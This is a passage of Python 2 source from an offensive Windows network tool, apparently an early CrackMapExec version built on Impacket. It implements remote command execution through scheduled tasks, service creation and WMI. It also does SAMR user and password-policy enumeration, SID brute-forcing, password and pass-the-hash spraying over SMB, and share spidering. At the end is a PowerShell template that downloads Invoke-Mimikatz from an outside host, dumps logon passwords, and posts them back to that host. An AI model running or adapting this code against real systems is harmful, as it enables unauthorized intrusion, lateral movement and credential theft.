            resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
            domainHandle = resp['DomainHandle']

            return rpctransport, dce, domainHandle

    def convert(self, low, high, no_zero):

        if low == 0 and hex(high) == "-0x80000000":
            return "Not Set"
        if low == 0 and high == 0:
            return "None"
        if no_zero: # make sure we have a +ve vale for the unsined int
            if (low != 0):
                high = 0 - (high+1)
            else:
                high = 0 - (high)
            low = 0 - low
        tmp = low + (high)*16**8 # convert to 64bit int
        tmp *= (1e-7) #  convert to seconds
        try:
            minutes = int(strftime("%M", gmtime(tmp)))  # do the conversion to human readable format
        except ValueError, e:
            return "BAD TIME:"
        hours = int(strftime("%H", gmtime(tmp)))
        days = int(strftime("%j", gmtime(tmp)))-1
        time = ""
        if days > 1:
         time = str(days) + " days "
        elif days == 1:
            time = str(days) + " day "
        if hours > 1:
            time += str(hours) + " hours "
        elif hours == 1:
            time = str(days) + " hour " 
        if minutes > 1:
            time += str(minutes) + " minutes"
        elif minutes == 1:
            time = str(days) + " minute "
        return time

    def get_pass_pol(self, host):
        rpctransport, dce, domainHandle = self.connect(host)

        res_list = []

        resp = samr.hSamrQueryInformationDomain(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
        
        min_pass_len = resp['Buffer']['Password']['MinPasswordLength']
        if min_pass_len == 0: min_pass_len = None

        pass_hst_len = resp['Buffer']['Password']['PasswordHistoryLength']
        if pass_hst_len == 0: pass_hst_len = None

        res_list.append('Minimum password length: {}'.format(min_pass_len))
        res_list.append('Password history length: {}'.format(pass_hst_len))

        max_pass_age = self.convert(resp['Buffer']['Password']['MaxPasswordAge']['LowPart'], 
                                    resp['Buffer']['Password']['MaxPasswordAge']['HighPart'],
                                    1)

        min_pass_age = self.convert(resp['Buffer']['Password']['MinPasswordAge']['LowPart'], 
                                    resp['Buffer']['Password']['MinPasswordAge']['HighPart'],
                                    1)
        if max_pass_age == 0: max_pass_age = None
        if min_pass_age == 0: min_pass_age = None

        res_list.append('Maximum password age: {}'.format(max_pass_age))
        res_list.append('Minimum password age: {}'.format(min_pass_age))

        resp = samr.hSamrQueryInformationDomain2(dce, domainHandle,samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)

        lock_threshold = int(resp['Buffer']['Lockout']['LockoutThreshold'])
        if lock_threshold == 0: lock_threshold = None

        res_list.append("Account lockout threshold: {}".format(lock_threshold))

        lock_duration = None
        if lock_threshold is not None: lock_duration = int(resp['Buffer']['Lockout']['LockoutDuration']) / -600000000

        res_list.append("Account lockout duration: {}".format(lock_duration))

        return res_list

    def get_users(self, host):
        rpctransport, dce, domainHandle = self.connect(host)
        entries = []

        try:
            status = STATUS_MORE_ENTRIES
            enumerationContext = 0
            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext = enumerationContext)
                except DCERPCException, e:
                    if str(e).find('STATUS_MORE_ENTRIES') < 0:
                        raise 
                    resp = e.get_packet()

                for user in resp['Buffer']['Buffer']:
                    r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])

                    info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
                    entries.append((user['Name'], user['RelativeId'], info['Buffer']['All']))
                    samr.hSamrCloseHandle(dce, r['UserHandle'])

                enumerationContext = resp['EnumerationContext'] 
                status = resp['ErrorCode']

        except ListUsersException as e:
            logging.info("Error listing users: %s" % e)

        dce.disconnect()

        return entries

class TSCH_EXEC:
    def __init__(self, username, password, command, domain ='', hashes=None , noOutput=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__myIPaddr = None
        self.__aesKey = None
        self.__doKerberos = False
        self.__command = command
        self.__tmpName = ''.join([random.choice(string.letters) for _ in range(8)])
        self.__tmpFileName = self.__tmpName + '.tmp'
        self.__smbConnection = None
        self.__dceConnection = None
        self.__noOutput = noOutput
        self.__mode = 'SHARE'
        self.output = ''
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos)

        try:
            self.doStuff(rpctransport)
        except SessionError as e:
            if args.verbose: traceback.print_exc()
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                #If we receive the 'STATUS_OBJECT_NAME_NOT_FOUND' error, it might work if we try again
                sleep(1)
                self.doStuff(rpctransport)
            else:
                if self.__noOutput is False:
                    self.__myIPaddr = self.__smbConnection.getSMBServer().get_socket().getsockname()[0]
                    logging.info('Starting SMB Server')
                    smb_server = SMBServer()
                    smb_server.daemon = True
                    smb_server.start()
                    self.__mode = 'SERVER'
                    self.doStuff(rpctransport)
                    smb_server.stop()

    def doStuff(self, rpctransport):
        def output_callback(data):
            self.output += data

        dce = rpctransport.get_dce_rpc()
        self.__dceConnection = dce

        dce.set_credentials(*rpctransport.get_credentials())
        dce.connect()
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""

        if self.__mode == 'SHARE':
            xml += """      <Arguments>/C {} &gt; %windir%\\Temp\\{} 2&gt;&amp;1</Arguments>
    </Exec>
  </Actions>
</Task>
        """.format(self.__command, self.__tmpFileName)

        elif self.__mode == 'SERVER':
            xml += """      <Arguments>/C {} &gt; \\\\{}\\{}\\{} 2&gt;&amp;1</Arguments>
    </Exec>
  </Actions>
</Task>
        """.format(self.__command, self.__myIPaddr, DUMMY_SHARE, self.__tmpFileName)

        taskCreated = False
        try:
            logging.info('Creating task \\%s' % self.__tmpName)
            tsch.hSchRpcRegisterTask(dce, '\\%s' % self.__tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            logging.info('Running task \\%s' % self.__tmpName)
            tsch.hSchRpcRun(dce, '\\%s' % self.__tmpName)

            done = False
            while not done:
                logging.info('Calling SchRpcGetLastRunInfo for \\%s' % self.__tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % self.__tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    sleep(2)

            logging.info('Deleting task \\%s' % self.__tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % self.__tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError, e:
            logging.info(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % self.__tmpName)

        if self.__noOutput is False:
            if self.__mode == 'SHARE':
                smbConnection = rpctransport.get_smb_connection()
                self.__smbConnection = smbConnection
                waitOnce = True
                while True:
                    try:
                        logging.info('Attempting to read ADMIN$\\Temp\\%s' % self.__tmpFileName)
                        smbConnection.getFile('ADMIN$', 'Temp\\%s' % self.__tmpFileName, output_callback)
                        break
                    except Exception, e:
                        if str(e).find('SHARING') > 0:
                            sleep(3)
                        elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                            if waitOnce is True:
                                # We're giving it the chance to flush the file before giving up
                                sleep(3)
                                waitOnce = False
                            else:
                                raise
                        else:
                            raise

            elif self.__mode == 'SERVER':
                wait = 0
                while wait < 5:
                    try:
                        with open(SMBSERVER_DIR + '/' + self.__tmpFileName,'r') as fd:
                            output_callback(fd.read())
                        break
                    except IOError:
                        sleep(1)
                        wait += 1

    def cleanup(self):
        logging.info('Deleting file ADMIN$\\Temp\\%s' % self.__tmpFileName)
        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % self.__tmpFileName)
        self.__dceConnection.disconnect()

class RemoteShellsmbexec():
    def __init__(self, share, rpc, mode, serviceName, command, noOutput=False):
        self.__share = share
        self.__mode = mode
        self.__noOutput = noOutput
        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__outputBuffer = ''
        self.__command = command
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.__scmr = rpc.get_dce_rpc()

        self.__scmr.connect()

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()

    def set_copyback(self):
        s = self.__rpc.get_smb_connection()
        s.setTimeout(100000)
        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect() 
           self.__scmr.bind(svcctl.MSRPC_UUID_SVCCTL)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception, e:
           pass

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        if self.__mode == 'SHARE':
            while True:
                try:
                    self.transferClient.getFile(self.__share, self.__output, output_callback)
                    break
                except Exception, e:
                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                        sleep(1)
                        pass
                    else:
                        logging.info('Error while reading command output: {}'.format(e))
                        raise SessionError
            
            self.transferClient.deleteFile(self.__share, self.__output)

        elif self.__mode == 'SERVER':
            with open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r') as fd:
                output_callback(fd.read())
            #self.transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
        if self.__mode == 'SERVER' and self.__noOutput is False:
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        try:
            resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
            service = resp['lpServiceHandle']
        except:
            return

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }

    def __init__(self, protocols = None,  username = '', password = '', domain = '', hashes = '', share = None, command= None, noOutput=False):
        if not protocols:
            protocols = CMDEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = self.service_generator()
        self.__domain = domain
        self.__command = command
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__doKerberos = None
        self.__share = share
        self.__noOutput = noOutput
        self.__mode  = 'SHARE'
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def service_generator(self, size=6, chars=string.ascii_uppercase):
        return ''.join(random.choice(chars) for _ in range(size))

    def run(self, addr):
        result = ''
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            #logging.info("Trying protocol %s..." % protocol)
            #logging.info("Creating service %s..." % self.__serviceName)

            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            try:
                self.shell = RemoteShellsmbexec(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command, self.__noOutput)
                result = self.shell.send_data(self.__command)
            except SessionError as e:
                if 'STATUS_SHARING_VIOLATION' in str(e):
                    return

                elif self.__noOutput is False:
                    logging.info('Starting SMB Server')
                    smb_server = SMBServer()
                    smb_server.daemon = True
                    smb_server.start()
                    self.__mode = 'SERVER'
                    self.shell = RemoteShellsmbexec(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
                    self.shell.set_copyback()
                    result = self.shell.send_data(self.__command)
                    smb_server.stop()

                else:
                    if args.verbose: traceback.print_exc()
                    if hasattr(self, 'shell'):
                        self.shell.finish()
                    sys.stdout.flush()

        return result

class RemoteShellwmi():
    def __init__(self, share, win32Process, smbConnection, mode, noOutput=False):
        self.__share = share
        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = noOutput
        self.__mode = mode

        # We don't wanna deal with timeouts from now on.
        self.__transferClient.setTimeout(100000)
        self.__myIPaddr = self.__transferClient.getSMBServer().get_socket().getsockname()[0]

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        if self.__mode == 'SHARE':
            while True:
                try:
                    self.__transferClient.getFile(self.__share, self.__output, output_callback)
                    break
                except Exception, e:
                    if "STATUS_SHARING_VIOLATION" in str(e):
                        sleep(1)
                        pass
                    else:
                        logging.info('Error while reading command output: {}'.format(e))
                        raise SessionError
            
            self.__transferClient.deleteFile(self.__share, self.__output)

        elif self.__mode == 'SERVER':
            wait = 0
            while wait < 5:
                try:
                    with open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r') as fd:
                        output_callback(fd.read())
                    break
                except IOError:
                    sleep(1)
                    wait += 1

    def execute_remote(self, data):
        command = self.__shell + data
        if self.__noOutput is False:
            if self.__mode == 'SERVER':
                command += ' 1> ' + '\\\\{}\\{}\\{}'.format(self.__myIPaddr, DUMMY_SHARE, OUTPUT_FILENAME)  + ' 2>&1'
            elif self.__mode == 'SHARE':
                command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'

        obj = self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result

class WMIEXEC:
    def __init__(self, command = '', username = '', password = '', domain = '', hashes = '', share = None, noOutput=False):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = False
        self.__mode = "SHARE"
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, smbConnection):
        result = ''
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, oxidResolver = True, doKerberos=self.__doKerberos)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process,_ = iWbemServices.GetObject('Win32_Process')

        try:
            self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection, self.__mode, self.__noOutput)
            result = self.shell.send_data(self.__command)
        except SessionError as e:
            if self.__noOutput is False:
                logging.info('Starting SMB Server')
                smb_server = SMBServer()
                smb_server.daemon = True
                smb_server.start()
                self.__mode = 'SERVER'
                self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection, self.__mode)
                result = self.shell.send_data(self.__command)
                smb_server.stop()

        dcom.disconnect()

        return result

class WMIQUERY:
    def __init__(self, address, username, password, domain, hashes, namespace):
        self.address = address
        self.username = username
        self.password = password
        self.domain= domain
        self.namespace = namespace
        self.lmhash = ''
        self.nthash = ''
        if hashes:
            self.lmhash, self.nthash = hashes.split(':')

    def run(self, query):

        record_dict = {}

        dcom = DCOMConnection(self.address, self.username, self.password, self.domain, self.lmhash, self.nthash, None, oxidResolver = True, doKerberos=False)

        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin(self.namespace, NULL, NULL)
        iWbemLevel1Login.RemRelease()

        query = query.strip('\n')
        if query[-1:] == ';':
            query = query[:-1]

        iEnumWbemClassObject = iWbemServices.ExecQuery(query.strip('\n'))

        printHeader = True
        while True:
            try:
                pEnum = iEnumWbemClassObject.Next(0xffffffff,1)[0]
                record = pEnum.getProperties()
                if printHeader is True:
                    for col in record:
                        record_dict[str(col)] = []
                    printHeader = False
                for key in record:
                    record_dict[key].append(str(record[key]['value']))
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise
                else:
                    break

        iEnumWbemClassObject.RemRelease()
        dcom.disconnect()

        return record_dict

class LSALookupSid:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\lsarpc]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\lsarpc]', 445),
        }

    def __init__(self, username, password, domain, protocols = None, hashes = None, maxRid=4000):
        if not protocols:
            protocols = LSALookupSid.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__maxRid = int(maxRid)
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def dump(self, addr):

        logging.info('Brute forcing SIDs at %s' % addr)

        # Try all requested protocols until one works.
        for protocol in self.__protocols:
            protodef = LSALookupSid.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            logging.info("Trying protocol %s..." % protocol)
            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

            try:
                self.__bruteForce(rpctransport, self.__maxRid)
            except Exception, e:
                logging.critical(str(e))
                raise
            else:
                # Got a response. No need for further iterations.
                break

    def __bruteForce(self, rpctransport, maxRid):
        dce = rpctransport.get_dce_rpc()
        entries = []
        dce.connect()

        # Want encryption? Uncomment next line
        # But make SIMULTANEOUS variable <= 100
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)

        # Want fragmentation? Uncomment next line
        #dce.set_max_fragment_size(32)

        dce.bind(lsat.MSRPC_UUID_LSAT)
        resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)

        domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()

        soFar = 0
        SIMULTANEOUS = 1000
        for j in range(maxRid/SIMULTANEOUS+1):
            if (maxRid - soFar) / SIMULTANEOUS == 0:
                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
            else: 
                sidsToCheck = SIMULTANEOUS
 
            if sidsToCheck == 0:
                break

            sids = []
            for i in xrange(soFar, soFar+sidsToCheck):
                sids.append(domainSid + '-%d' % i)
            try:
                lsat.hLsarLookupSids(dce, policyHandle, sids,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException, e:
                if str(e).find('STATUS_NONE_MAPPED') >= 0:
                    soFar += SIMULTANEOUS
                    continue
                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                    resp = e.get_packet()
                else: 
                    raise

            for n, item in enumerate(resp['TranslatedNames']['Names']):
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    entries.append("{}: {}\\{} ({})".format(soFar+n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'], SID_NAME_USE.enumItems(item['Use']).name))
            soFar += SIMULTANEOUS

        self.entries = entries
        dce.disconnect()

class RPCENUM():
    def __init__(self, username, password, domain='', hashes=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__ts = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def connect(self, host, service):

        if service == 'wkssvc':
            stringBinding = r'ncacn_np:{}[\PIPE\wkssvc]'.format(host)
        elif service == 'srvsvc':
            stringBinding = r'ncacn_np:{}[\PIPE\srvsvc]'.format(host)

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()

        if service == 'wkssvc':
            dce.bind(wkst.MSRPC_UUID_WKST, transfer_syntax = self.__ts)
        elif service == 'srvsvc':
            dce.bind(srvs.MSRPC_UUID_SRVS, transfer_syntax = self.__ts)

        return dce, rpctransport

    def enum_logged_on_users(self, host):
        dce, rpctransport = self.connect(host, 'wkssvc')
        users_info = {}
        try:
            resp = wkst.hNetrWkstaUserEnum(dce, 1)
            return resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']
        except Exception:
            resp = wkst.hNetrWkstaUserEnum(dce, 0)
            return resp['UserInfo']['WkstaUserInfo']['Level0']['Buffer']

    def enum_sessions(self, host):
        dce, rpctransport = self.connect(host, 'srvsvc')
        session_info = {}
        try:
            resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 502)
            return resp['InfoStruct']['SessionInfo']['Level502']['Buffer']
        except Exception:
            resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 0)
            return resp['InfoStruct']['SessionInfo']['Level0']['Buffer']

        #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 1)
        #resp.dump()

        #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 2)
        #resp.dump()

        #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
        #resp.dump()

    def enum_disks(self, host):
        dce, rpctransport = self.connect(host, 'srvsvc')
        try:
            resp = srvs.hNetrServerDiskEnum(dce, 1)
            return resp
        except Exception:
            resp = srvs.hNetrServerDiskEnum(dce, 0)
            return resp

def smart_login(host, smb, domain):
    if args.combo_file:
        with open(args.combo_file, 'r') as combo_file:
            for line in combo_file:
                try:
                    line = line.strip()

                    lmhash = ''
                    nthash = ''

                    if '\\' in line:
                        domain, user_pass = line.split('\\')
                    else:
                        user_pass = line

                    '''
                    Here we try to manage two cases: if an entry has a hash as the password,
                    or if the plain-text password contains a ':'
                    '''
                    if len(user_pass.split(':')) == 3:
                        hash_or_pass = ':'.join(user_pass.split(':')[1:3]).strip()

                        #Not the best way to determine of it's an NTLM hash :/
                        if len(hash_or_pass) == 65 and len(hash_or_pass.split(':')[0]) == 32 and len(hash_or_pass.split(':')[1]) == 32:
                            lmhash, nthash = hash_or_pass.split(':')
                            passwd = hash_or_pass
                            user = user_pass.split(':')[0]

                    elif len(user_pass.split(':')) == 2:
                        user, passwd = user_pass.split(':')

                    try:
                        smb.login(user, passwd, domain, lmhash, nthash)
                        print_succ("{}:{} Login successful '{}\\{}:{}'".format(host, args.port, domain, user, passwd))
                        return smb
                    except SessionError as e:
                        print_error("{}:{} '{}\\{}:{}' {}".format(host, args.port, domain, user, passwd, e))
                        continue

                except Exception as e:
                    print_error("Error parsing line '{}' in combo file: {}".format(line, e))
                    continue
    else:
        usernames = []
        passwords = []
        hashes    = []

        if args.user is not None:
            if os.path.exists(args.user):
                usernames = open(args.user, 'r')
            else:
                usernames = args.user.split(',')

        if args.passwd is not None:
            if os.path.exists(args.passwd):
                passwords = open(args.passwd, 'r')
            else:
                '''
                You might be wondering: wtf is this? why not use split()?
                This is in case a password contains a comma! we can use '\\' to make sure it's parsed correctly
                IMHO this is a much better way than writing a custom split() function
                '''
                try:
                    passwords = csv.reader(StringIO.StringIO(args.passwd), delimiter=',', escapechar='\\').next()
                except StopIteration:
                    #in case we supplied only '' as the password (null session)
                    passwords = ['']

        if args.hash is not None:
            if os.path.exists(args.hash):
                hashes = open(args.hash, 'r')
            else:
                hashes = args.hash.split(',')

        for user in usernames:
            user = user.strip()

            try:
                hashes.seek(0)
            except AttributeError:
                pass

            try:
                passwords.seek(0)
            except AttributeError:
                pass

            if hashes:
                for ntlm_hash in hashes:
                    ntlm_hash = ntlm_hash.strip().lower()
                    lmhash, nthash = ntlm_hash.split(':')
                    try:
                        smb.login(user, '', domain, lmhash, nthash)

                        if user == '': user = '(null)'
                        print_succ("{}:{} Login successful '{}\\{}:{}'".format(host, args.port, domain, user, ntlm_hash))
                        return smb
                    except SessionError as e:
                        if user == '': user = '(null)'
                        print_error("{}:{} '{}\\{}:{}' {}".format(host, args.port, domain, user, ntlm_hash, e))
                        continue

            if passwords:
                for passwd in passwords:
                    passwd = passwd.strip()
                    try:
                        smb.login(user, passwd, domain)

                        if user == '': user = '(null)'
                        if passwd == '': passwd = '(null)'
                        print_succ("{}:{} Login successful '{}\\{}:{}'".format(host, args.port, domain, user, passwd))
                        return smb
                    except SessionError as e:
                        if user == '': user = '(null)'
                        if passwd == '': passwd = '(null)'
                        print_error("{}:{} '{}\\{}:{}' {}".format(host, args.port, domain, user, passwd, e))
                        continue

    raise socket.error

def spider(smb_conn, ip, share, subfolder, patt, depth):
    try:
        filelist = smb_conn.listPath(share, subfolder+'\\*')
        dir_list(filelist, ip, subfolder, patt)
        if depth == 0:
            return 0
    except SessionError:
        return 1

    for result in filelist:
        if result.is_directory() and result.get_longname() != '.' and result.get_longname() != '..':
            spider(smb_conn, ip, share,subfolder+'/'+result.get_longname().encode('utf8'), patt, depth-1)
    return 0

def dir_list(files,ip,path,pattern):
    for result in files:
        for instance in pattern:
            if instance in result.get_longname():
                if result.is_directory():
                    print_att("//%s/%s/%s [dir]" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
                else:
                    print_att("//%s/%s/%s" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
    return 0

def _listShares(smb):
    permissions = {}
    root = ntpath.normpath("\\{}".format(PERM_DIR))
    
    for share in smb.listShares():
        share_name = share['shi1_netname'][:-1].encode('utf8')
        permissions[share_name] = "NO ACCESS"

        try:
            if smb.listPath(share_name, '', args.passwd):
                permissions[share_name] = "READ"
        except:
            pass

        try:
            if smb.createDirectory(share_name, root):
                smb.deleteDirectory(share_name, root)
                permissions[share_name] = "READ, WRITE"
        except:
            pass

    return permissions

def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurlsa::logonpasswords exit'):

    if katz_ip:
        command = """
        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Mimikatz.ps1');
        $creds = Invoke-Mimikatz -Command "{katz_command}";
        $request = [System.Net.WebRequest]::Create('http://{addr}');
        $request.Method = "POST";
        $request.ContentType = "application/x-www-form-urlencoded";
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
